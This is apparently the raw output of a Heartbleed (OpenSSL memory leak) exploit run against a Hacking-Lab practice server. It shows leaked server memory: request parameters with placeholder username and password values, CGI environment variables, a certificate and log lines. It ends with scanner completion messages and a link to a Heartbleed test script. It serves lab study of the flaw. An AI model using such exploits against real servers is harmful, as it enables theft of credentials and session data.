...Ph.~..F...ea.S|.f.....y.)c.'......YGh..*V..z_9X...H...l.n...!eD(_GB..Ce.A.N.....1.....e.O,e..7..G.......J....=.......i&1N}:..ZpL.E$Td':._>G...g...QL=X..w............Cn.Y.\4S..........M.n..Q.o..B~....&....."1...ht..T....p..f.l.D.E.....u......K.7.i....~..h..q!r..1.x.G.sp......0.....;.Hs.a.......$.*Cwr...)..<.#.{.A2....%....i...BL...f..4..........."..b#K.1V...q~.C.f.Z...()...5..[g...X.....dG.....ux.8......H....^.1.L.P..I..}Dj...'.j....K......mA.H...2..W.m..Q...Y-D&....E).........Z-.....he;k...4:S$"q6...J...Jk^......y.2.p..)....HT..&....,..h+..Pb.m..q.X.~.....Q.T...5.....rI.....LE"y.m.h..C.......x....X..5..b.t...*..F..9.+Ye~%..#*.1...n.,....d..[.&...............[G.)..396..gm...A..|...y.t..Y|.O.j......*..bq.$...o.............Q....3....Z4.,]"n.\.]n...."./....3......._.h...]N.... ...S.R"K.5i.h.;...b.{%..........W..Wk.....n9..16<j..s7|Ui........~...83..l..q.....sT..#...o@.......).)........Y.....O..k.......9l..e....r ZUU....H..i^7..........J..r...=.i.)]P....<g.?.......!vZT..S;..\..2.....K-...pC5i..p..c....U...)..y....J....9l.^...T~............>...m..64...FF.J;o....].U....VF...J....oG..=.c../r.Z3.@.s.G@..et..vL....P..R$.wo6f.k.Qf.....6._...4.v$.H.M......B...`4.q...I...,v..,.S.R.M....~..IE....d......`...O..~...qy.........s"..(-....R./gS.Y.....M0r......u..h)n...9("..O...o.(.'.DV.X6 ...h..e./.........L{.. .A0a9#..X...6.....7.A.._.r.Kr)..Z..l.E...7(.i..#..W.....<.*?.q...YJ...x.d3.Q.\..W!$...~...h..2....~.c..<.0.ggM8..s}*>|n.a.e..i.r.S.C...:.v(1......a.....2R.N.....(.e..,z@..lK.a......j(.w.M..N....3......@..........Y....tf...*.....A.M../..{<...!....{...x*..}.zQ\.>9...q.......,.......-....Evu?.9q..}..n.XA.s.`...}...d.Y..(...Q..^.f^.4..=n..wC...............8la...P&..}...K{....P.!.DZ.'Y.n.@;....F...S.V.b.L{=..Bo..........f.....y..x../q....h<i.l$oJl..U2W.K`...f.]m3.BR~.KA}...j...O[....M8.*5N.(O....Q.RKE.R..ic..{....).K2l~.l...(..F|t..4HA..CUn`..T.'@...1Z......c..c............................................................. ..................................@e..............8.......0............................f.....".!.9.8.........5.............................3.2.....E.D...../...A..........................................................................................................(...8...................................................................p4......................8z......8z..........................................................................................................................................................................+ZB.....................6..........................................`.8...QF.2....}F ...O..v..g......HTTP_USER_AGENT.HTTP_HOST..)..[WHTTP_ACCEPT.x{D./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin....heartbleed.hacking-lab.com...;..443.y.4.......:C45754._.0...$...................p...............T.......H...d...X.......<...................|...................p...............d...X.......................|...0...$...T.......H...<...$#,.....IRCS/#,.....IRCS.-H...H.PTTHP...`..._LSS0.......PTTH@.......PTTHP.......PTTH....`...HTAP....p...L_DL........VRES.....j..VRES........VRES....x...VRES........VRES........................P.......UQER........TNOC.....n..TNOC.....k..VRES........IRCS........OMERB...:...ETAG........VRES........UQER........REUQ........UQERT.......IRCS.,V.H...ETAD!,V..0V.ETAD*,V..0V.TSAL8,V.....UCODX,V..0V.RESUb,V.....UCODp,V.p...REUQ&..b.1s....xq.....l.^.6P..~....9....$#,.....IRCS/#,.....IRCS.-H...H.PTTHH...X..._LSS8.......PTTHH.......PTTHX.......PTTH....h...HTAP....p...L_DL........VRES.....j..VRES........VRES/login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB..VRESusername=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBB........................=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa\&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB..R.h_w.m..~...X.s.^.a.(.p<....4H5..yt....O\$......y..V.E.t.@.......F.....U@.....username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB..username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa\&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB.$7...=|..."r..7.C.....n....M .M. ...Ti.4.hz.4H.]D,....7......oS.C..l..K.g.,..o......$...................@..............................8..........w.p......../......p...max-age=31536000; includeSubDomains....q........................0.........w.p...........................0.7,....kLg].....d&.....\4:..o...b ..`...e...........H.....Y).I..l..j...k............2.\){z....I #......IRTS._.-........p..?=...p.'......|.O....)[......Nn.h..Z..........................q...........A..+............9&]...b...F....Zdj..Ubg.............,..R..g #..x...IRTS....s...ECCA.3..>@..NART.3...d..TNOC................(.....np....................r)......D...D...........@.....w.p...Tue, 29 Apr 2014 13:20:14 GMT... #..............x...#...#.......................s.......#........3..............>@........................................................................................................................................................................................................................................................................w.p...H....................l.........................? .......(...............X.......X...................D...D...........@.....w.p...........0...P...p...........P...h...x...........................=BBBBBBBSCRIPT_URL=/login.html.HSCRIPT_URI=https://heartbleed.hacking-lab.com/login.html.AAAAAAAHTTPS=on.aa&passSSL_TLS_SNI=heartbleed.hacking-lab.com..HTTP_USER_AGENT=curl/7.21.0 (i486-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6.ameHTTP_HOST=heartbleed.hacking-lab.com.ordHTTP_ACCEPT=*/*.PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin.inux-gLD_LIBRARY_PATH=/opt/applic/httpd-2.4.9/lib..4 lSERVER_SIGNATURE=./1.2.6SERVER_SOFTWARE=Apache/2.4.9 (Unix) OpenSSL/1.0.1b.ept. SERVER_NAME=heartbleed.hacking-lab.com..SERVER_ADDR=192.168.200.179.ab.cSERVER_PORT=443.REMOTE_ADDR=192.168.200.179.ackiDOCUMENT_ROOT=/opt/applic/httpd-2.4.9/htdocs....REQUEST_SCHEME=https....CONTEXT_PREFIX=.CONTEXT_DOCUMENT_ROOT=/opt/applic/httpd-2.4.9/htdocs.n.hSERVER_ADMIN=you@example.com.a..SCRIPT_FILENAME=/opt/applic/httpd-2.4.9/htdocs/login.html...(...REMOTE_PORT=45754.......GATEWAY_INTERFACE=CGI/1.1.......SERVER_PROTOCOL=HTTP/1.1.....X..REQUEST_METHOD=GET.. ...QUERY_STRING=username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB.....REQUEST_URI=/login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB..SCRIPT_NAME=/login.html.DATE_LOCAL=.y.>.DATE_GMT=..4tP..LAST_MODIFIED=..DOCUMENT_URI=/login.html...a..u.USER_NAME=.....3DOCUMENT_NAME=login.html.!f.J...QUERY_STRING_UNESCAPED=username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa\&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB./........@.,.p...hO#.T.......)...@P#.................N....O#..............O#.........8....O#..............O#.........&....O#.....8...t....O#.........$....O#..............O#.........A....O#.....0...+....O#.....`........O#.....x...2....O#.........&....O#..............O#..............O#..............O#.....(...,....O#.....X........O#.....p........O#.........4....O#..............O#.........9....O#..............O#.....0........O#.....P........O#.....p........O#.........[....O#.........f....O#.....P........O#.....h........O#.....x........O#..............O#..............O#..............O#..............O#.........f............T..H...P.........,.p...................................................................................P.......@.,.p...DATE_LOCAL......Tuesday, 29-Apr-2014 09:20:14 EDT.......none....entity..Tuesday, 29-Apr-2014 09:20:14 EDT...............................0...x2....T..2....T..2..D....2..h....2.......2.......2..................................g.......................192.168.200.179..._S[29/Apr/2014:09:20:14 -0400]......_SGET /login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB HTTP/1.1...........200.......H........(...2..@5041...(...192.168.200.179 - - [29/Apr/2014:09:20:14 -0400] "GET /login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB HTTP/1.1" 200 5041.....................................*........$......................................................login...html....html.....d.......d..............text/html.......SSL_TLS_SNI.....heartbleed.hacking-lab.com......`...............................`*......................x0......................................P.........w.p...............................................................................8.......<...<...........8.....w.p...............!.................................................................../opt/applic/httpd-2.4.9/htdocs/login.html.......H...X...p.s.P.s.Wed, 23 Apr 2014 12:53:29 GMT..."88-4f7b53816c440"............................................................136...........d...d...........`.....w.p.......@e....................V..+V.....................".......j........+V. ....+V......e.......e...........,V.....................................X.........w.p..................................................................................................................................... repeated 910 times ..................................................................................................................................... ..@.......................P...........He..........2..S_....s....WG.[......^1 ...,'.......................w...s..p..m0..i0.......n{.x..a0...*.H........0y1.0...U....CH1.0...U....SG1.0...U....Jona1.0...U....Hacking-Lab1.0...U....Heartbleed1#0!..U....heartbleed.hacking-lab.com0...140423101901Z..150423101901Z0y1.0...U....CH1.0...U....SG1.0...U....Jona1.0...U....Hacking-Lab1.0...U....Heartbleed1#0!..U....heartbleed.hacking-lab.com0..0...*.H............0.......v[D..C.&.\E...\$%.+n...u.qJ......t%....(3...9.G.!lR..w`r..*.4....x....7._.o......`.o[+ZB.H..rH..9....\o2H..\.6....v.......@>2A......0...*.H.............`.8...QF.2....}F ...O..v..g......5..+..q.....i/Ry8......^Y..)..[W.......e...Xx{D.?.Ih..c.....ud!.G.k...>..k)gz.7-i...c...V..A6.............A...".....g...Zq..]?....5...)M..bY...nr.../u...f..6_..g.........E....>..Qr..u........79"...*[......Q.....A....)S.!....tCb.zr{#.+...1a.k.... .)";.B........}...9 .z|...[...2.O,....6....&M.....E"...z.............t...(.......L.......@...4...$#,.....IRCS/#,.....IRCS.-H...H.PTTHH...X..._LSS8.......PTTHH.......PTTHX.......PTTH....h...HTAP....p...L_DL........VRES.....j..VRES........VRES....x...VRES........VRES................#...2........./.UQER.................n..TNOC........VRES....................OMER.................... ...........UQER........REUQ........UQERT.......IRCS.,V.....!...!,V..0V..........0V.TSAL8,V.....UCODX,V..0V....."...........p,V. ...REUQ....................................$#,.....IRCS/#,.....IRCS.-H...H.PTTHP...`..._LSS0.......PTTH@.......PTTHP.......PTTH....`...HTAP....p...L_DL........VRES.....j..VRES........VRES....x...VRES........VRES........OMER.....n..UCOD....p?H.UQER........TNOC.....n..TNOC.....k..VRES........IRCS........OMERB...:...ETAG........VRES........UQERBBBB...................."...=AAA....AAAA....AAAA....AAAAAaa\&password=BBBBBB....BBBBBBBBBBBBBBBBBBB.................................................................................username=AAAAAAAAAAAAAAA....AAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB..username=AAAAAAAAAAAAAAA.L......GATE....s...ECCA....s...ECCA.4..^...TNOCBBBBBBB.....................................................................................,...................H.........................................w.p......../......p...max-age=31536000; in....eSubDomains.............................8.........w.p........................................................................................................................... #..x...IRTS.4......TNOC.............................................................`.......................................................................... #......IRTS....s...ECCA.3..>@..NART.3...d..TNOC................0...................................L...L...........H.....w.p...Tue,....Apr 2014 13:20:11 GMT... #..................#...:#,....._DOMT(U.....M.PA..H..zK..LSS.+V..-V.E.ON........>@....................................................................................T.........................................................................................................................................p...H.....................................w.p...H...............................0............... .......0...............X...........................L...L...........@...P.s.p...GET /login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB HTTP/1.1..I=httpsGET.eart/login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB.com.e/login.html?username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB.libid/login.html.h2/1username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAaa&password=BBBBBBBBBBBBBBBBBBBBBBBBBBBBB./HTTP/1.1./local/User-Agent. curl/7.21.0 (i486-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6..RVER_SHost. heartbleed.hacking-lab.com..L/1.0.Accept. */*..R_N..E=hear........(...ng-l(...........ER_Aheartbleed.hacking-lab.com.VER_P........8z..........192.heartbleed.hacking-lab.com.OT=/o........................................p4..................EXT_....................MENTp ..p ........................../login.html.ER_A................H_...a.......h..`...........................H........(...2..@9......(...................P....................,...........5...........................Q.......X...]...5...!......6".. ...............................................Pr..........................................*........$......................https://heartbleed.hacking-lab.com/login.html.rd/login.html.BBBB....8...BBBB........PT_NAME=/login.html.DATE_LOCAL=.4.9/DATE_GMT=.icon.iLAST_MODIFIED=.pDOCUMENT_URI=/login.html.vicon.iUSER_NAME=..0...DOCUMENT_NAME=login.html........QUERY_STRING_UNESCAPED=u0.rname=/opt/applic/httpd-2.4.9/htdocs/login.html.BBBBBB/opt/applic/httpd-2.4.9/htdocs/login.html...T...p...0...p4..................N............................k...k..8n.. .................../opt/applic/httpd-2.4.9/htdocs/./...$.../opt/applic/httpd-2.4.9/htdocs/login.html...+.......................................`...................................................................................................................................................8o......................................................................................................*...............................(p..8m........../opt/applic/httpd-2.4.9/htdocs/.H...............H_...a.......h..`...........................H........(...2..@9......(...................P....................,...........5...........................Q.......X...]...5..8o..........................................................Pr..........................................*........$......................(p..8m..........8...hr.......................2..........................................................login.html..179.................h...`.......400]....................tml?p ..p ........................../login.html.wordh...............H_...a.......h..`...........................H........(...2..@9......(...................P....................,...........5...........................Q.......X...]...5...!......'"..................................................Pr..........................................*........$..........................................o-bg........login...html....html.....d.......d..........p...text/html.......SSL_TLS_SNI.....heartbleed.hacking-lab.com......`...............................`*......................x0......................................X.........w.p...............................................................................@.......D...D...........@.....w.p...............!.................................................................../opt/applic/httpd-2.4.9/htdocs/login.html.x-age=P...`...p.s.P.s.Wed, 23 Apr 2014 12:53:29 GMT..."88-4f7b53816c440"..p......122998..........125209.............................136.w.p.......l...l...........h.....w.p.......X.....................V..+V....................."299....j........+V.(....+V..........................,V.....................................P.........w.p..................................................................................................................................... repeated 457 times .....................................................................................................................................
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+
+https://github.com/musalbas/heartbleed-masstest/blob/master/ssltest.py
